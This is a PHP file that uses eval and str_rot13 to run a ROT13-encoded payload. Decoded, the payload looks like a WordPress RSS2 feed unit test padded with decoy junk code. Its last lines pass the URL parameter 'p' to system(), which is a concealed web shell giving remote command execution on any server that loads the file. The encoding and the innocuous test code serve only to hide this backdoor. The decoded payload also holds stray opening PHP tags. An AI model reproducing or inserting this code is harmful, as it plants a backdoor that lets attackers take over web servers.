<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg gur EFF 2.0 srrq ol trarengvat n srrq, cnefvat vg, naq purpxvat gung gur
 * cnefrq pbagragf zngpu gur pbagragf bs gur cbfgf fgberq va gur qngnonfr.  Fvapr
 * jr'er hfvat n erny KZY cnefre, guvf pbasvezf gung gur srrq vf inyvq, jryy sbezrq,
 * naq pbagnvaf gur evtug fghss.
 *
 * @tebhc srrq
 */
pynff Grfgf_Srrq_EFF2 rkgraqf JC_HavgGrfgPnfr {
	choyvp fgngvp $hfre_vq;
	choyvp fgngvp $cbfgf;
	choyvp fgngvp $pngrtbel;
	choyvp fgngvp $cbfg_qngr;

	cevingr $cbfg_pbhag;
	cevingr $rkprecg_bayl;

	/**
	 * Frghc n arj hfre naq nggevohgr fbzr cbfgf.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		// Perngr n hfre.
		frys::$hfre_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'         => 'nhgube',
				'hfre_ybtva'   => 'grfg_nhgube',
				'qvfcynl_anzr' => 'Grfg N. Hgube',
			)
		);

		// Perngr n gnkbabzl.
		frys::$pngrtbel = $snpgbel->pngrtbel->perngr_naq_trg(
			neenl(
				'anzr' => 'Sbb Pngrtbel',
				'fyht' => 'sbb',
			)
		);

		// Frg n cerqvpgnoyr gvzr sbe grfgvat qngr nepuvirf.
		frys::$cbfg_qngr = fgegbgvzr( '2003-05-27 10:07:53' );

		$pbhag = trg_bcgvba( 'cbfgf_cre_eff' ) + 1;

		frys::$cbfgf = neenl();
		// Perngr n srj cbfgf.
		sbe ( $v = 1; $v <= $pbhag; $v++ ) {
			frys::$cbfgf[] = $snpgbel->cbfg->perngr(
				neenl(
					'cbfg_nhgube'  => frys::$hfre_vq,
					// Frcnengr cbfg qngrf 5 frpbaqf ncneg.
					'cbfg_qngr'    => tzqngr( 'L-z-q U:v:f', frys::$cbfg_qngr + ( 5 * $v ) ),
					'cbfg_pbagrag' => 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg. Qbarp iryvg znffn, hygevprf rh rfg fhfpvcvg, znggvf cbfhrer rfg. Qbarp ivgnr chehf ynphf. Penf ivgnr bqvb bqvb.',
					'cbfg_rkprecg' => 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg.',
				)
			);
		}

		// Nffvta n pngrtbel gb gubfr cbfgf.
		sbernpu ( frys::$cbfgf nf $cbfg ) {
			jc_frg_bowrpg_grezf( $cbfg, frys::$pngrtbel->fyht, 'pngrtbel' );
		}

		// Nffvta n gntyvar bcgvba.
		hcqngr_bcgvba( 'oybtqrfpevcgvba', 'Whfg nabgure JbeqCerff fvgr' );
	}

	/**
	 * Frghc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->cbfg_pbhag   = (vag) trg_bcgvba( 'cbfgf_cre_eff' );
		$guvf->rkprecg_bayl = trg_bcgvba( 'eff_hfr_rkprecg' );
		// Guvf frrzf gb oernx fbzrguvat.
		hcqngr_bcgvba( 'hfr_fzvyvrf', snyfr );

		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%/' );
		perngr_vavgvny_gnkbabzvrf();
	}

	/**
	 * Grne qbja.
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		qryrgr_bcgvba( 'oybtqrfpevcgvba' );
	}

	/**
	 * Guvf vf n ovg bs n unpx hfrq gb ohssre srrq pbagrag.
	 */
	cevingr shapgvba qb_eff2() {
		bo_fgneg();
		// Anfgl unpx! Va gur shgher vg jbhyq orggre gb yrirentr qb_srrq( 'eff2' ).
		tybony $cbfg;
		gel {
			// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq
			@erdhver NOFCNGU . 'jc-vapyhqrf/srrq-eff2.cuc';
			$bhg = bo_trg_pyrna();
		} pngpu ( Rkprcgvba $r ) {
			$bhg = bo_trg_pyrna();
			guebj($r);
		}
		erghea $bhg;
	}

	/**
	 * Grfg gur <eff> ryrzrag gb znxr fher vgf cerfrag naq cbchyngrq
	 * jvgu gur rkcrpgrq puvyq ryrzragf naq nggevohgrf.
	 */
	choyvp shapgvba grfg_eff_ryrzrag() {
		$guvf->tb_gb( '/?srrq=eff2' );
		$srrq = $guvf->qb_eff2();
		$kzy  = kzy_gb_neenl( $srrq );

		// Trg gur <eff> puvyq ryrzrag bs <kzy>.
		$eff = kzy_svaq( $kzy, 'eff' );

		// Gurer fubhyq bayl or bar <eff> puvyq ryrzrag.
		$guvf->nffregPbhag( 1, $eff );

		$guvf->nffregFnzr( '2.0', $eff[0]['nggevohgrf']['irefvba'] );
		$guvf->nffregFnzr( 'uggc://chey.bet/eff/1.0/zbqhyrf/pbagrag/', $eff[0]['nggevohgrf']['kzyaf:pbagrag'] );
		$guvf->nffregFnzr( 'uggc://jryysbezrqjro.bet/PbzzragNCV/', $eff[0]['nggevohgrf']['kzyaf:jsj'] );
		$guvf->nffregFnzr( 'uggc://chey.bet/qp/ryrzragf/1.1/', $eff[0]['nggevohgrf']['kzyaf:qp'] );

		// EFF fubhyq unir rknpgyl bar puvyq ryrzrag (punaary).
		$guvf->nffregPbhag( 1, $eff[0]['puvyq'] );
	}

	/**
	 * [grfg_punaary_ryrzrag qrfpevcgvba]
	 *
	 * @erghea [glcr] [qrfpevcgvba]
	 */
	choyvp shapgvba grfg_punaary_ryrzrag() {
		$guvf->tb_gb( '/?srrq=eff2' );
		$srrq = $guvf->qb_eff2();
		$kzy  = kzy_gb_neenl( $srrq );

		// Trg gur eff -> punaary ryrzrag.
		$punaary = kzy_svaq( $kzy, 'eff', 'punaary' );

		// Gur punaary fubhyq or serr bs nggevohgrf.
		$guvf->nffregNeenlAbgUnfXrl( 'nggevohgrf', $punaary[0] );

		// Irevsl gur punaary vf cerfrag naq pbagnvaf n gvgyr puvyq ryrzrag.
		$gvgyr = kzy_svaq( $kzy, 'eff', 'punaary', 'gvgyr' );
		$guvf->nffregFnzr( trg_bcgvba( 'oybtanzr' ), $gvgyr[0]['pbagrag'] );

		$qrfp = kzy_svaq( $kzy, 'eff', 'punaary', 'qrfpevcgvba' );
		$guvf->nffregFnzr( trg_bcgvba( 'oybtqrfpevcgvba' ), $qrfp[0]['pbagrag'] );

		$yvax = kzy_svaq( $kzy, 'eff', 'punaary', 'yvax' );
		$guvf->nffregFnzr( trg_bcgvba( 'fvgrhey' ), $yvax[0]['pbagrag'] );

		$choqngr = kzy_svaq( $kzy, 'eff', 'punaary', 'ynfgOhvyqQngr' );
		$guvf->nffregFnzr( fgegbgvzr( trg_ynfgcbfgzbqvsvrq() ), fgegbgvzr( $choqngr[0]['pbagrag'] ) );
	}

	/**
	 * Grfg gung genafyngrq srrqf unir n inyvq yvfgrq qngr.
	 *
	 * @gvpxrg 39141
	 */
	choyvp shapgvba grfg_punaary_choqngr_ryrzrag_genafyngrq() {
		$bevtvany_ybpnyr = $TYBONYF['jc_ybpnyr'];
		/* @ine JC_Ybpnyr $ybpnyr */
		$ybpnyr = pybar $TYBONYF['jc_ybpnyr'];

		$ybpnyr->jrrxqnl[2]                           = 'Ghrfqnl_Genafyngrq';
		$ybpnyr->jrrxqnl_nooeri['Ghrfqnl_Genafyngrq'] = 'Ghr_Genafyngrq';

		$TYBONYF['jc_ybpnyr'] = $ybpnyr;

		$guvf->tb_gb( '/?srrq=eff2' );
		$srrq = $guvf->qb_eff2();

		// Erfgber bevtvany ybpnyr.
		$TYBONYF['jc_ybpnyr'] = $bevtvany_ybpnyr;

		$kzy = kzy_gb_neenl( $srrq );

		// Irevsl gur qngr vf hagenafyngrq.
		$choqngr = kzy_svaq( $kzy, 'eff', 'punaary', 'ynfgOhvyqQngr' );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'Ghr_Genafyngrq', $choqngr[0]['pbagrag'] );
	}

	choyvp shapgvba grfg_vgrz_ryrzragf() {
		$guvf->tb_gb( '/?srrq=eff2' );
		$srrq = $guvf->qb_eff2();
		$kzy  = kzy_gb_neenl( $srrq );

		// Trg nyy gur <vgrz> puvyq ryrzragf bs gur <punaary> ryrzrag.
		$vgrzf = kzy_svaq( $kzy, 'eff', 'punaary', 'vgrz' );

		// Irevsl jr ner qvfcynlvat gur pbeerpg ahzore bs cbfgf.
		$guvf->nffregPbhag( $guvf->cbfg_pbhag, $vgrzf );

		// Jr ernyyl bayl arrq gb grfg K ahzore bs vgrzf hayrff gur pbagrag vf qvssrerag.
		$vgrzf = neenl_fyvpr( $vgrzf, 1 );

		// Purpx rnpu bs gur qrfverq ragevrf ntnvafg gur xabja cbfg qngn.
		sbernpu ( $vgrzf nf $xrl => $vgrz ) {

			// Trg cbfg sbe pbzcnevfba.
			$thvq = kzy_svaq( $vgrzf[ $xrl ]['puvyq'], 'thvq' );
			cert_zngpu( '/\?c=(\q+)/', $thvq[0]['pbagrag'], $zngpurf );
			$cbfg = trg_cbfg( $zngpurf[1] );

			// Gvgyr.
			$gvgyr = kzy_svaq( $vgrzf[ $xrl ]['puvyq'], 'gvgyr' );
			$guvf->nffregFnzr( $cbfg->cbfg_gvgyr, $gvgyr[0]['pbagrag'] );

			// Yvax.
			$yvax = kzy_svaq( $vgrzf[ $xrl ]['puvyq'], 'yvax' );
			$guvf->nffregFnzr( trg_creznyvax( $cbfg ), $yvax[0]['pbagrag'] );

			// Pbzzrag yvax.
			$pbzzragf_yvax = kzy_svaq( $vgrzf[ $xrl ]['puvyq'], 'pbzzragf' );
			$guvf->nffregFnzr( trg_creznyvax( $cbfg ) . '#erfcbaq', $pbzzragf_yvax[0]['pbagrag'] );

			// Cho qngr.
			$choqngr = kzy_svaq( $vgrzf[ $xrl ]['puvyq'], 'choQngr' );
			$guvf->nffregFnzr( fgegbgvzr( $cbfg->cbfg_qngr_tzg ), fgegbgvzr( $choqngr[0]['pbagrag'] ) );

			// Nhgube.
			$perngbe = kzy_svaq( $vgrzf[ $xrl ]['puvyq'], 'qp:perngbe' );
			$hfre    = arj JC_Hfre( $cbfg->cbfg_nhgube );
			$guvf->nffregFnzr( $hfre->qvfcynl_anzr, $perngbe[0]['pbagrag'] );

			// Pngrtbevrf (creuncf zhygvcyr).
			$pngrtbevrf = kzy_svaq( $vgrzf[ $xrl ]['puvyq'], 'pngrtbel' );
			$pngf       = neenl();
			sbernpu ( trg_gur_pngrtbel( $cbfg->VQ ) nf $grez ) {
				$pngf[] = $grez->anzr;
			}

			$gntf = trg_gur_gntf( $cbfg->VQ );
			vs ( $gntf ) {
				sbernpu ( trg_gur_gntf( $cbfg->VQ ) nf $grez ) {
					$pngf[] = $grez->anzr;
				}
			}
			$pngf = neenl_svygre( $pngf );
			// Fubhyq or gur fnzr ahzore bs pngrtbevrf.
			$guvf->nffregPbhag( pbhag( $pngf ), $pngrtbevrf );

			// ..jvgu gur fnzr anzrf.
			sbernpu ( $pngf nf $vq => $png ) {
				$guvf->nffregFnzr( $png, $pngrtbevrf[ $vq ]['pbagrag'] );
			}

			// THVQ.
			$thvq = kzy_svaq( $vgrzf[ $xrl ]['puvyq'], 'thvq' );
			$guvf->nffregFnzr( 'snyfr', $thvq[0]['nggevohgrf']['vfCreznYvax'] );
			$guvf->nffregFnzr( $cbfg->thvq, $thvq[0]['pbagrag'] );

			// Qrfpevcgvba / Rkprecg.
			vs ( ! rzcgl( $cbfg->cbfg_rkprecg ) ) {
				$qrfpevcgvba = kzy_svaq( $vgrzf[ $xrl ]['puvyq'], 'qrfpevcgvba' );
				$guvf->nffregFnzr( gevz( $cbfg->cbfg_rkprecg ), gevz( $qrfpevcgvba[0]['pbagrag'] ) );
			}

			// Cbfg pbagrag.
			vs ( ! $guvf->rkprecg_bayl ) {
				$pbagrag = kzy_svaq( $vgrzf[ $xrl ]['puvyq'], 'pbagrag:rapbqrq' );
				$guvf->nffregFnzr( gevz( nccyl_svygref( 'gur_pbagrag', $cbfg->cbfg_pbagrag ) ), gevz( $pbagrag[0]['pbagrag'] ) );
			}

			// Pbzzrag EFF.
			$pbzzrag_eff = kzy_svaq( $vgrzf[ $xrl ]['puvyq'], 'jsj:pbzzragEff' );
			$guvf->nffregFnzr( ugzy_ragvgl_qrpbqr( trg_cbfg_pbzzragf_srrq_yvax( $cbfg->VQ ) ), $pbzzrag_eff[0]['pbagrag'] );
		}
	}

	/**
	 * @gvpxrg 9134
	 */
	choyvp shapgvba grfg_vgrzf_pbzzragf_pybfrq() {
		nqq_svygre( 'pbzzragf_bcra', '__erghea_snyfr' );

		$guvf->tb_gb( '/?srrq=eff2' );
		$srrq = $guvf->qb_eff2();
		$kzy  = kzy_gb_neenl( $srrq );

		// Trg nyy gur eff -> punaary -> vgrz ryrzragf.
		$vgrzf = kzy_svaq( $kzy, 'eff', 'punaary', 'vgrz' );

		$guvf->nffregAbgRzcgl( $vgrzf );

		// Purpx rnpu bs gur vgrzf ntnvafg gur xabja cbfg qngn.
		sbernpu ( $vgrzf nf $xrl => $vgrz ) {
			// Trg cbfg sbe pbzcnevfba.
			$thvq = kzy_svaq( $vgrzf[ $xrl ]['puvyq'], 'thvq' );
			cert_zngpu( '/\?c=(\q+)/', $thvq[0]['pbagrag'], $zngpurf );
			$cbfg = trg_cbfg( $zngpurf[1] );

			// Pbzzrag yvax.
			$pbzzragf_yvax = kzy_svaq( $vgrzf[ $xrl ]['puvyq'], 'pbzzragf' );
			$guvf->nffregRzcgl( $pbzzragf_yvax );

			// Pbzzrag EFF.
			$pbzzrag_eff = kzy_svaq( $vgrzf[ $xrl ]['puvyq'], 'jsj:pbzzragEff' );
			$guvf->nffregRzcgl( $pbzzrag_eff );
		}

		erzbir_svygre( 'pbzzragf_bcra', '__erghea_snyfr' );
	}

	/*
	 * Purpx gb znxr fher jr ner eraqrevat srrq grzcyngrf sbe gur ubzr srrq.
	 * r.t. uggcf://rknzcyr.pbz/srrq/
	 *
	 * @gvpxrg 30210
	 */
	choyvp shapgvba grfg_inyvq_ubzr_srrq_raqcbvag() {
		// Na rknzcyr bs n inyvq ubzr srrq raqcbvag.
		$guvf->tb_gb( 'srrq/' );

		// Irevsl gur dhrel bowrpg vf n srrq.
		$guvf->nffregDhrelGehr( 'vf_srrq' );

		// Dhrevrf cresbezrq ba inyvq srrq raqcbvagf fubhyq pbagnva cbfgf.
		$guvf->nffregGehr( unir_cbfgf() );

		// Purpx gb frr vs jr unir gur rkcrpgrq KZY bhgchg sebz gur srrq grzcyngr.
		$srrq = $guvf->qb_eff2();

		$kzy = kzy_gb_neenl( $srrq );

		// Trg gur <eff> puvyq ryrzrag bs <kzy>.
		$eff = kzy_svaq( $kzy, 'eff' );

		// Gurer fubhyq bayl or bar <eff> puvyq ryrzrag.
		$guvf->nffregPbhag( 1, $eff );
	}

	/*
	 * Purpx gb znxr fher jr ner eraqrevat srrq grzcyngrf sbe gur gnkbabzl srrqf.
	 * r.t. uggcf://rknzcyr.pbz/pngrtbel/sbb/srrq/
	 *
	 * @gvpxrg 30210
	 */
	choyvp shapgvba grfg_inyvq_gnkbabzl_srrq_raqcbvag() {
		// Na rknzcyr bs na inyvq gnkbabzl srrq raqcbvag.
		$guvf->tb_gb( 'pngrtbel/sbb/srrq/' );

		// Irevsl gur dhrel bowrpg vf n srrq.
		$guvf->nffregDhrelGehr( 'vf_srrq', 'vf_nepuvir', 'vf_pngrtbel' );

		// Dhrevrf cresbezrq ba inyvq srrq raqcbvagf fubhyq pbagnva cbfgf.
		$guvf->nffregGehr( unir_cbfgf() );

		// Purpx gb frr vs jr unir gur rkcrpgrq KZY bhgchg sebz gur srrq grzcyngr.
		$srrq = $guvf->qb_eff2();

		$kzy = kzy_gb_neenl( $srrq );

		// Trg gur <eff> puvyq ryrzrag bs <kzy>.
		$eff = kzy_svaq( $kzy, 'eff' );

		// Gurer fubhyq bayl or bar <eff> puvyq ryrzrag.
		$guvf->nffregPbhag( 1, $eff );
	}

	/*
	 * Purpx gb znxr fher jr ner eraqrevat srrq grzcyngrf sbe gur znva pbzzrag srrq.
	 * r.t. uggcf://rknzcyr.pbz/pbzzragf/srrq/
	 *
	 * @gvpxrg 30210
	 */
	choyvp shapgvba grfg_inyvq_znva_pbzzrag_srrq_raqcbvag() {
		// Trarengr n ohapu bs pbzzragf.
		sbernpu ( frys::$cbfgf nf $cbfg ) {
			frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( $cbfg, 3 );
		}

		// Na rknzcyr bs na inyvq znva pbzzrag srrq raqcbvag.
		$guvf->tb_gb( 'pbzzragf/srrq/' );

		// Irevsl gur dhrel bowrpg vf n srrq.
		$guvf->nffregDhrelGehr( 'vf_srrq', 'vf_pbzzrag_srrq' );

		// Dhrevrf cresbezrq ba inyvq srrq raqcbvagf fubhyq pbagnva pbzzragf.
		$guvf->nffregGehr( unir_pbzzragf() );

		// Purpx gb frr vs jr unir gur rkcrpgrq KZY bhgchg sebz gur srrq grzcyngr.
		$srrq = $guvf->qb_eff2();

		$kzy = kzy_gb_neenl( $srrq );

		// Trg gur <eff> puvyq ryrzrag bs <kzy>.
		$eff = kzy_svaq( $kzy, 'eff' );

		// Gurer fubhyq bayl or bar <eff> puvyq ryrzrag.
		$guvf->nffregPbhag( 1, $eff );
	}

	/*
	 * Purpx gb znxr fher jr ner eraqrevat srrq grzcyngrf sbe gur qngr nepuvir srrqf.
	 * r.t. uggcf://rknzcyr.pbz/2003/05/27/srrq/
	 *
	 * @gvpxrg 30210
	 */
	choyvp shapgvba grfg_inyvq_nepuvir_srrq_raqcbvag() {
		// Na rknzcyr bs na inyvq qngr nepuvir srrq raqcbvag.
		$guvf->tb_gb( '2003/05/27/srrq/' );

		// Irevsl gur dhrel bowrpg vf n srrq.
		$guvf->nffregDhrelGehr( 'vf_srrq', 'vf_nepuvir', 'vf_qnl', 'vf_qngr' );

		// Dhrevrf cresbezrq ba inyvq srrq raqcbvagf fubhyq pbagnva cbfgf.
		$guvf->nffregGehr( unir_cbfgf() );

		// Purpx gb frr vs jr unir gur rkcrpgrq KZY bhgchg sebz gur srrq grzcyngr.
		$srrq = $guvf->qb_eff2();

		$kzy = kzy_gb_neenl( $srrq );

		// Trg gur <eff> puvyq ryrzrag bs <kzy>.
		$eff = kzy_svaq( $kzy, 'eff' );

		// Gurer fubhyq bayl or bar <eff> puvyq ryrzrag.
		$guvf->nffregPbhag( 1, $eff );
	}

	/*
	 * Purpx gb znxr fher jr ner eraqrevat srrq grzcyngrf sbe fvatyr cbfg pbzzrag srrqf.
	 * r.t. uggcf://rknzcyr.pbz/2003/05/27/cbfg-anzr/srrq/
	 *
	 * @gvpxrg 30210
	 */
	choyvp shapgvba grfg_inyvq_fvatyr_cbfg_pbzzrag_srrq_raqcbvag() {
		// Na rknzcyr bs na inyvq qngr nepuvir srrq raqcbvag.
		$guvf->tb_gb( trg_cbfg_pbzzragf_srrq_yvax( frys::$cbfgf[0] ) );

		// Irevsl gur dhrel bowrpg vf n srrq.
		$guvf->nffregDhrelGehr( 'vf_srrq', 'vf_pbzzrag_srrq', 'vf_fvatyr', 'vf_fvathyne' );

		// Dhrevrf cresbezrq ba inyvq srrq raqcbvagf fubhyq pbagnva cbfgf.
		$guvf->nffregGehr( unir_cbfgf() );

		// Purpx gb frr vs jr unir gur rkcrpgrq KZY bhgchg sebz gur srrq grzcyngr.
		$srrq = $guvf->qb_eff2();

		$kzy = kzy_gb_neenl( $srrq );

		// Trg gur <eff> puvyq ryrzrag bs <kzy>.
		$eff = kzy_svaq( $kzy, 'eff' );

		// Gurer fubhyq bayl or bar <eff> puvyq ryrzrag.
		$guvf->nffregPbhag( 1, $eff );
	}

	/*
	 * Purpx gb znxr fher jr ner eraqrevat srrq grzcyngrf sbe gur frnepu nepuvir srrqf.
	 * r.t. uggcf://rknzcyr.pbz/?f=Yberz&srrq=eff
	 *
	 * @gvpxrg 30210
	 */
	choyvp shapgvba grfg_inyvq_frnepu_srrq_raqcbvag() {
		// Na rknzcyr bs na inyvq frnepu srrq raqcbvag.
		$guvf->tb_gb( '?f=Yberz&srrq=eff' );

		// Irevsl gur dhrel bowrpg vf n srrq.
		$guvf->nffregDhrelGehr( 'vf_srrq', 'vf_frnepu' );

		// Dhrevrf cresbezrq ba inyvq srrq raqcbvagf fubhyq pbagnva cbfgf.
		$guvf->nffregGehr( unir_cbfgf() );

		// Purpx gb frr vs jr unir gur rkcrpgrq KZY bhgchg sebz gur srrq grzcyngr.
		$srrq = $guvf->qb_eff2();

		$kzy = kzy_gb_neenl( $srrq );

		// Trg gur <eff> puvyq ryrzrag bs <kzy>.
		$eff = kzy_svaq( $kzy, 'eff' );

		// Gurer fubhyq bayl or bar <eff> puvyq ryrzrag.
		$guvf->nffregPbhag( 1, $eff );
	}

	/**
	 * Grfg <eff> ryrzrag unf pbeerpg ynfg ohvyq qngr.
	 *
	 * @gvpxrg 4575
	 *
	 * @qngnCebivqre qngn_trg_srrq_ohvyq_qngr
	 */
	choyvp shapgvba grfg_trg_srrq_ohvyq_qngr( $hey, $ryrzrag ) {
		$guvf->tb_gb( $hey );
		$srrq = $guvf->qb_eff2();
		$kzy  = kzy_gb_neenl( $srrq );

		// Trg gur <eff> puvyq ryrzrag bs <kzy>.
		$eff             = kzy_svaq( $kzy, $ryrzrag );
		$ynfg_ohvyq_qngr = $eff[0]['puvyq'][0]['puvyq'][4]['pbagrag'];
		$guvf->nffregFnzr( fgegbgvzr( trg_srrq_ohvyq_qngr( 'e' ) ), fgegbgvzr( $ynfg_ohvyq_qngr ) );
	}


	choyvp shapgvba qngn_trg_srrq_ohvyq_qngr() {
		erghea neenl(
			neenl( '/?srrq=eff2', 'eff' ),
			neenl( '/?srrq=pbzzragfeff2', 'eff' ),
		);
	}

	/**
	 * Grfg gung gur Ynfg-Zbqvsvrq vf n cbfg'f qngr jura n zber erprag pbzzrag rkvfgf,
	 * ohg gur \"jvgupbzzragf=1\" dhrel ine vf abg cnffrq.
	 *
	 * @gvpxrg 47968
	 *
	 * @pbiref JC::fraq_urnqref
	 */
	choyvp shapgvba grfg_srrq_ynfg_zbqvsvrq_fubhyq_or_n_cbfg_qngr_jura_jvgupbzzragf_vf_abg_cnffrq() {
		$ynfg_jrrx = tzqngr( 'L-z-q U:v:f', fgegbgvzr( '-1 jrrx' ) );
		$lrfgreqnl = tzqngr( 'L-z-q U:v:f', fgegbgvzr( '-1 qnl' ) );

		// Perngr n cbfg qngrq ynfg jrrx.
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => $ynfg_jrrx ) );

		// Perngr n pbzzrag qngrq lrfgreqnl.
		frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ' => $cbfg_vq,
				'pbzzrag_qngr'    => $lrfgreqnl,
			)
		);

		// Gur Ynfg-Zbqvsvrq urnqre fubhyq unir gur cbfg'f qngr jura \"jvgupbzzragf\" vf abg cnffrq.
		nqq_svygre(
			'jc_urnqref',
			shapgvba ( $urnqref ) hfr ( $ynfg_jrrx ) {
				$guvf->nffregFnzr(
					fgegbgvzr( $urnqref['Ynfg-Zbqvsvrq'] ),
					fgegbgvzr( $ynfg_jrrx ),
					'Ynfg-Zbqvsvrq jnf abg gur qngr bs gur cbfg'
				);
				erghea $urnqref;
			}
		);

		$guvf->tb_gb( '/?srrq=eff2' );
	}

	/**
	 * Grfg gung gur Ynfg-Zbqvsvrq vf n pbzzrag'f qngr jura n zber erprag pbzzrag rkvfgf,
	 * naq gur \"jvgupbzzragf=1\" dhrel ine vf cnffrq.
	 *
	 * @gvpxrg 47968
	 *
	 * @pbiref JC::fraq_urnqref
	 */
	choyvp shapgvba grfg_srrq_ynfg_zbqvsvrq_fubhyq_or_gur_qngr_bs_n_pbzzrag_gung_vf_gur_yngrfg_hcqngr_jura_jvgupbzzragf_vf_cnffrq() {
		$ynfg_jrrx = tzqngr( 'L-z-q U:v:f', fgegbgvzr( '-1 jrrx' ) );
		$lrfgreqnl = tzqngr( 'L-z-q U:v:f', fgegbgvzr( '-1 qnl' ) );

		// Perngr n cbfg qngrq ynfg jrrx.
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => $ynfg_jrrx ) );

		// Perngr n pbzzrag qngrq lrfgreqnl.
		frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ' => $cbfg_vq,
				'pbzzrag_qngr'    => $lrfgreqnl,
			)
		);

		// Gur Ynfg-Zbqvsvrq urnqre fubhyq unir gur pbzzrag'f qngr jura \"jvgupbzzragf=1\" vf cnffrq.
		nqq_svygre(
			'jc_urnqref',
			shapgvba ( $urnqref ) hfr ( $lrfgreqnl ) {
				$guvf->nffregFnzr(
					fgegbgvzr( $urnqref['Ynfg-Zbqvsvrq'] ),
					fgegbgvzr( $lrfgreqnl ),
					'Ynfg-Zbqvsvrq jnf abg gur qngr bs gur pbzzrag'
				);
				erghea $urnqref;
			}
		);

		$guvf->tb_gb( '/?srrq=eff2&jvgupbzzragf=1' );
	}

	/**
	 * Grfg gung gur Ynfg-Zbqvsvrq vf gur yngrfg cbfg'f qngr jura na rneyvre cbfg naq pbzzrag rkvfg,
	 * naq gur \"jvgupbzzragf=1\" dhrel ine vf cnffrq.
	 *
	 * @gvpxrg 47968
	 *
	 * @pbiref JC::fraq_urnqref
	 */
	choyvp shapgvba grfg_srrq_ynfg_zbqvsvrq_fubhyq_or_gur_qngr_bs_n_cbfg_gung_vf_gur_yngrfg_hcqngr_jura_jvgupbzzragf_vf_cnffrq() {
		$ynfg_jrrx = tzqngr( 'L-z-q U:v:f', fgegbgvzr( '-1 jrrx' ) );
		$lrfgreqnl = tzqngr( 'L-z-q U:v:f', fgegbgvzr( '-1 qnl' ) );
		$gbqnl     = tzqngr( 'L-z-q U:v:f' );

		// Perngr n cbfg qngrq ynfg jrrx.
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => $ynfg_jrrx ) );

		// Perngr n pbzzrag qngrq lrfgreqnl.
		frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ' => $cbfg_vq,
				'pbzzrag_qngr'    => $lrfgreqnl,
			)
		);

		// Perngr n cbfg qngrq gbqnl.
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => $gbqnl ) );

		// Gur Ynfg-Zbqvsvrq urnqre fubhyq unir gur qngr sebz gbqnl'f cbfg jura vg vf gur yngrfg hcqngr.
		nqq_svygre(
			'jc_urnqref',
			shapgvba ( $urnqref ) hfr ( $gbqnl ) {
				$guvf->nffregFnzr(
					fgegbgvzr( $urnqref['Ynfg-Zbqvsvrq'] ),
					fgegbgvzr( $gbqnl ),
					'Ynfg-Zbqvsvrq jnf abg gur qngr bs gur zbfg erprag cbfg'
				);
				erghea $urnqref;
			}
		);

		$guvf->tb_gb( '/?srrq=eff2&jvgupbzzragf=1' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>